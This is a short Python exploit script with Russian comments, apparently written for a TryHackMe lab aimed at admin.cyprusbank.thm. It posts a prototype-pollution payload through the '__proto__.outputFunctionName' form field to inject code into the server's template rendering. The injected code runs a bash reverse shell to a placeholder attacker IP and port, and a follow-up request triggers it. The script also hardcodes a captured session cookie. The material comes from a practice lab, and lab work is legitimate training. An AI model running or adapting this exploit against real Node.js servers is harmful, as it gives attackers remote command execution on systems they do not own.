import requests

# 1. Настрой свои данные для Reverse Shell!
# ЗАМЕНИ <ТВОЙ_IP_В_VPN> на твой IP-адрес в сети TryHackMe (tun0)
# ЗАМЕНИ <ТВОЙ_ПОРТ> на порт, который будешь слушать (например, 4444)
cmd = 'bash -c "bash -i >& /dev/tcp/<ТВОЙ_IP_В_VPN>/<ТВОЙ_ПОРТ> 0>&1"'

print("Starting Attack...")

# 2. Твои куки из Burp Suite (взял с твоего 4-го скриншота)
# Если сессия вдруг истекла, просто скопируй сюда свежий connect.sid из браузера/Burp
cookies = {
    'connect.sid': 's%3ApkPeWFhZ4GgtPUH2d2lSmo3B-VbV98KH.%2BawpufFhXtrwCW%2BKGyH05iMqR0RqkAMJcBjF%2BruNjQU'
}

# 3. URL уязвимой страницы
url = 'http://admin.cyprusbank.thm/settings'

# 4. Отправляем зловредный payload (pollute) с нашими куками
requests.post(url, cookies=cookies, files={'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

# 5. Триггерим выполнение команды (вызываем рендер страницы)
requests.get(url, cookies=cookies)

print("Finished!")
